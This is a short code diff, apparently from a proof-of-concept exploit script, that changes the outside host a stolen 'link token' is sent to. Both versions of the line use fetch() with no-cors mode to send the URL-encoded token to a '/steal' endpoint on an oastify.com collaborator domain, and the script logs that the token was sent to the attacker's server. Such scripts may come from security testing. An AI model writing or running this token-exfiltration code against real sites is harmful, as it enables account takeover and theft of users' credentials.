@@ -6,7 +6,7 @@
 
     if (linkToken) {
         // Send the token to the attacker's Oastify server
-        fetch('https://042tev3yyomm6wuyw1lxfuonjepbd51u.oastify.com/steal?token=' + encodeURIComponent(linkToken), {
+        fetch('https://betutt5vyf64cny1mq6w5yei69c00qof.oastify.com/steal?token=' + encodeURIComponent(linkToken), {
             mode: 'no-cors' // Using no-cors bypasses cross-origin issues, even though we don't see the response
         });
         console.log('[!] Link Token sent to attacker server');
